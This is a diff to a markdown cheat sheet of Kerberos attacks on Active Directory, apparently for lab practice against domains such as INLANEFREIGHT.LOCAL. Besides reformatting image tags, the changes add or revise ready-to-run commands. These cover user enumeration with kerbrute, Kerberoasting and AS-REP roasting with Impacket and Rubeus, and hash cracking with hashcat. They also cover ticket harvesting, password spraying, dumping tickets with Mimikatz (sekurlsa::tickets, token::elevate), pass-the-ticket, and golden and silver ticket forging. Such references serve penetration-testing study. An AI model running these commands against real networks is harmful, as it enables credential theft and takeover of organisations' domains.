@@ -22,7 +22,9 @@
 
 *
 
-    <figure><img src="https://i.imgur.com/VRr2B6w.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/VRr2B6w.png" alt=""><figcaption></figcaption></figure>
+```
 
 ### Kerberos Tickets Overview
 
@@ -59,7 +61,9 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 * This will brute force user accounts from a domain controller using a supplied wordlist
 *
 
-    <figure><img src="https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png" alt=""><figcaption></figcaption></figure>
+```
 
 #### Enumerate Users Metasploit
 
@@ -82,16 +86,16 @@ auxiliary/gather/kerberos_enumusers
 
 ```
 # List SPN accounts
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 
 # Request all TGS tickets
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 
 # Request a single user's ticket
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 
 # Save to output file
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
 
 ### Kerberoasting with Rubeus (Windows)
@@ -99,6 +103,9 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 ```
 # View kerberoastable stats
 .\Rubeus.exe kerberoast /stats
+
+# Kerberoast all accounts
+.\Rubeus.exe kerberoast /nowrap 
 
 # Kerberoast all accounts with admincount=1
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
@@ -134,12 +141,6 @@ setspn.exe -Q */*
 # Request ticket using PowerShell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
-```
-
-```
-# Extract with Mimikatz
-mimikatz # base64 /out:true
-mimikatz # kerberos::list /export
 ```
 
 ### Kerberoasting with Invoke-Kerberoast (Windows)
@@ -216,17 +217,17 @@ Set-DomainObject -Credential $Cred -Identity targetuser -Clear serviceprincipaln
 * After validating the timestamp the KDC will then issue a TGT for the user.
 * If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
 
-### AS-REP Roasting with GetNPUsers.py (Linux)
+### AS-REP Roasting with GetNPUsers (Linux)
 
 ```
 # With a user list
-GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.161 -request -usersfile users.txt
+impacket-GetNPUsers DOMAIN/ -dc-ip 10.10.10.161 -request -usersfile users.txt
 
 # Single user (just press enter when it asks for a password)
-GetNPUsers.py DOMAIN/svc-alfresco -dc-ip 10.10.10.161 -no-pass
+impacket-GetNPUsers DOMAIN/svc-alfresco -dc-ip 10.10.10.161 -no-pass
 
 # Loop through users
-for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 DOMAIN/${user} | grep -v Impacket; done
+for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 DOMAIN/${user} | grep -v Impacket; done
 ```
 
 ### AS-REP Roasting with Rubeus (Windows)
@@ -234,7 +235,7 @@ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 DOMAIN/$
 * This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
 
 ```
-Rubeus.exe asreproast
+.\Rubeus.exe asreproast /nowrap
 ```
 
 ### Cracking AS-REP Hashes
@@ -252,12 +253,14 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 * This command tells Rubeus to harvest for TGTs every 30 seconds
 
 ```
-Rubeus.exe harvest /interval:30
+Rubeus.exe harvest /interval:30 /nowrap
 ```
 
 *
 
-    <figure><img src="https://i.imgur.com/VCeyyn9.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/VCeyyn9.png" alt=""><figcaption></figcaption></figure>
+```
 
 ### Brute-Forcing and Password-Spraying with Rubeus
 
@@ -271,12 +274,15 @@ echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 * This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
 
 ```
-Rubeus.exe brute /password:Password1 /noticket
+.\Rubeus.exe brute /password:Password1 /noticket
 ```
 
 *
 
-    <figure><img src="https://i.imgur.com/WN4zVo5.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/WN4zVo5.png" alt=""><figcaption></figcaption></figure>
+```
+
 * Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
 
 ## Pass the Ticket with Mimikatz
@@ -290,14 +296,16 @@ Rubeus.exe brute /password:Password1 /noticket
 * This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets
 *
 
-    <figure><img src="https://i.imgur.com/V6SOlll.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/V6SOlll.png" alt=""><figcaption></figcaption></figure>
+```
 
 ### Prepare Mimikatz & Dump Tickets
 
 * You will need to run the command prompt as an administrator
 
 ```
-mimikatz.exe
+.\mimikatz.exe
 privilege::debug
 ```
 
@@ -305,10 +313,23 @@ privilege::debug
 * This will export all of the .kirbi tickets into the directory that you are currently in
 
 ```
+# need administrator or system
+token::elevate
 sekurlsa::tickets /export
+
+# Extract with Mimikatz (any domain user)
+# only tgt/tgs cached in current session
+base64 /out:true
+kerberos::list /export
 ```
 
 * When looking for which ticket to impersonate I would recommend looking for an administrator ticket
+* Same commands above but single shot versions
+
+```
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" exit
+.\mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
+```
 
 ### Pass the Ticket with Mimikatz
 
@@ -321,7 +342,10 @@ kerberos::ptt <ticket>
 
 *
 
-    <figure><img src="https://i.imgur.com/DwXmm8Z.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/DwXmm8Z.png" alt=""><figcaption></figcaption></figure>
+```
+
 * Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
 
 ```
@@ -349,7 +373,9 @@ klist
 
 *
 
-    <figure><img src="https://i.imgur.com/VOEsU4O.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/VOEsU4O.png" alt=""><figcaption></figcaption></figure>
+```
 
 ```
 mimikatz.exe
@@ -369,7 +395,10 @@ Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id
 * Simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 *
 
-    <figure><img src="https://i.imgur.com/rh06qDl.png" alt=""><figcaption></figcaption></figure>
+```
+<figure><img src="https://i.imgur.com/rh06qDl.png" alt=""><figcaption></figcaption></figure>
+```
+
 * This will open a new elevated command prompt with the given ticket in mimikatz.
 
 ```
